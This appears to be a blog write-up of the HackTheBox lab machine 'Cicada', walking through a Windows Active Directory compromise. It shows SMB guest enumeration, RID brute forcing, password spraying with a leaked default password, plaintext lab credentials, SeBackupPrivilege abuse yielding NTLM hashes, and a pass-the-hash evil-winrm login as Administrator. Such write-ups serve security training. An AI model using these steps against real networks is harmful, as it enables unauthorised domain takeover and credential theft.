---
layout: post
title: "HackTheBox: Cicada"
description: A writeup for Hackthebox Cicada
date:   2024-10-01 12:06:31 +0000
image:  '/images/post/cicada.jpg'
tags:   [HackTheBox,htb]
---
## Setup
`mkdir -p ~/ctf/HackTheBox/cicada/scans; cd ~/ctf/HackTheBox/cicada`
IP Address: 10.10.11.35


`echo "10.10.11.35 cicada.htb" | sudo tee -a /etc/hosts`
10.10.11.35 cicada.htb

***
### Enumeration 

`nmap -sC -sV -Pn -p- cicada.htb -oN scans/nmap -vv`
`nmap -sC -sV -p- -T5 --min-rate 2500 -oN scans/nmap_2 cicada.htb`
```
# nmap findings


PORT      STATE SERVICE        REASON
53/tcp    open  domain         syn-ack
88/tcp    open  kerberos-sec   syn-ack
135/tcp   open  msrpc          syn-ack
139/tcp   open  netbios-ssn    syn-ack
389/tcp   open  ldap           syn-ack
445/tcp   open  microsoft-ds   syn-ack
464/tcp   open  kpasswd5       syn-ack
593/tcp   open  http-rpc-epmap syn-ack
636/tcp   open  ldapssl        syn-ack
5985/tcp  open  wsman          syn-ack
50767/tcp open  unknown        syn-ack

```



Found Note from HR.txt in SMB guest share 
```

Dear new hire!

Welcome to Cicada Corp! We're thrilled to have you join our team. As part of our security protocols, it's essential that you change your default password to something unique and secure.

Your default password is: Cicada$M6Corpb*@Lp#nZp!8

To change your password:

1. Log in to your Cicada Corp account** using the provided username and the default password mentioned above.
2. Once logged in, navigate to your account settings or profile settings section.
3. Look for the option to change your password. This will be labeled as "Change Password".
4. Follow the prompts to create a new password**. Make sure your new password is strong, containing a mix of uppercase letters, lowercase letters, numbers, and special characters.
5. After changing your password, make sure to save your changes.

Remember, your password is a crucial aspect of keeping your account secure. Please do not share your password with anyone, and ensure you use a complex password.

If you encounter any issues or need assistance with changing your password, don't hesitate to reach out to our support team at support@cicada.htb.

Thank you for your attention to this matter, and once again, welcome to the Cicada Corp team!

Best regards,
Cicada Corp

```

Using RID/ SID Brute forcing we get the following 
`lookupsid.py guest@10.10.11.35 -no-pass`
`crackmapexec smb 10.10.11.35 -u 'guest' -p '' --rid-brute
`
```


Impacket v0.12.0 - Copyright Fortra, LLC and its affiliated companies 

[*] Brute forcing SIDs at 10.10.11.35
[*] StringBinding ncacn_np:10.10.11.35[\pipe\lsarpc]
[*] Domain SID is: S-1-5-21-917908876-1423158569-3159038727
498: CICADA\Enterprise Read-only Domain Controllers (SidTypeGroup)
500: CICADA\Administrator (SidTypeUser)
501: CICADA\Guest (SidTypeUser)
502: CICADA\krbtgt (SidTypeUser)
512: CICADA\Domain Admins (SidTypeGroup)
513: CICADA\Domain Users (SidTypeGroup)
514: CICADA\Domain Guests (SidTypeGroup)
515: CICADA\Domain Computers (SidTypeGroup)
516: CICADA\Domain Controllers (SidTypeGroup)
517: CICADA\Cert Publishers (SidTypeAlias)
518: CICADA\Schema Admins (SidTypeGroup)
519: CICADA\Enterprise Admins (SidTypeGroup)
520: CICADA\Group Policy Creator Owners (SidTypeGroup)
521: CICADA\Read-only Domain Controllers (SidTypeGroup)
522: CICADA\Cloneable Domain Controllers (SidTypeGroup)
525: CICADA\Protected Users (SidTypeGroup)
526: CICADA\Key Admins (SidTypeGroup)
527: CICADA\Enterprise Key Admins (SidTypeGroup)
553: CICADA\RAS and IAS Servers (SidTypeAlias)
571: CICADA\Allowed RODC Password Replication Group (SidTypeAlias)
572: CICADA\Denied RODC Password Replication Group (SidTypeAlias)
1000: CICADA\CICADA-DC$ (SidTypeUser)
1101: CICADA\DnsAdmins (SidTypeAlias)
1102: CICADA\DnsUpdateProxy (SidTypeGroup)
1103: CICADA\Groups (SidTypeGroup)
1104: CICADA\john.smoulder (SidTypeUser)
1105: CICADA\sarah.dantelia (SidTypeUser)
1106: CICADA\michael.wrightson (SidTypeUser)
1108: CICADA\david.orelious (SidTypeUser)
1109: CICADA\Dev Support (SidTypeGroup)
1601: CICADA\emily.oscars (SidTypeUser)
```

```
User list:
CICADA-DC$
john.smoulder
sarah.dantelia
michael.wrightson
david.orelious
emily.oscars
```
using crackmapexec we get `michael.wrightson:Cicada$M6Corpb*@Lp#nZp!8`

![a3dc4c40b6f42502459af7e6395c1254.png]({{site.baseurl}}/images/post/a3dc4c40b6f42502459af7e6395c1254.png)

we get another password from description
`david.orelious:aRt$Lp#7t*VQ!3`


We get access to dev share 
![34441f2039f6b63a54906459f729cc07.png]({{site.baseurl}}/images/post/34441f2039f6b63a54906459f729cc07.png)

in dev share we find password for emily.oscars
![a657aa4feeb1cc95ddea85677ba42e46.png]({{site.baseurl}}/images/post/a657aa4feeb1cc95ddea85677ba42e46.png)

`emily.oscars:Q!3@Lp#M6b*7t*Vt`


***
# user flag
Location: C:\Users\emily.oscars.CICADA\Desktop | Flag: e83a7##################################
```

***
#### Privilege Escalation

```

using assigned privileges we use **SeBackupPrivilege**
![dac3b5623835eb4b5f326cc61c9692a4.png]({{site.baseurl}}/images/post/dac3b5623835eb4b5f326cc61c9692a4.png)
![f64d2c81ec0ab99f35e7378c710d136b.png]({{site.baseurl}}/images/post/f64d2c81ec0ab99f35e7378c710d136b.png)
![f6bf22feda995b69a53d929da6340581.png]({{site.baseurl}}/images/post/f6bf22feda995b69a53d929da6340581.png)
```
Administrator:500:aad3b435b51404eeaad3b435b51404ee:2b87e7c93a3e8a0ea4a581937016f341:::
Guest:501:aad3b435b51404eeaad3b435b51404ee:31d6cfe0d16ae931b73c59d7e0c089c0:::
DefaultAccount:503:aad3b435b51404eeaad3b435b51404ee:31d6cfe0d16ae931b73c59d7e0c089c0:::

```

using Pass-the-hash `evil-winrm -i 10.10.11.35 -u 'administrator' -H '2b87e7c93a3e8a0ea4a581937016f341' 
`


# root flag
Location: :\Users\Administrator\Desktop | Flag: b1dc7##################################
```

```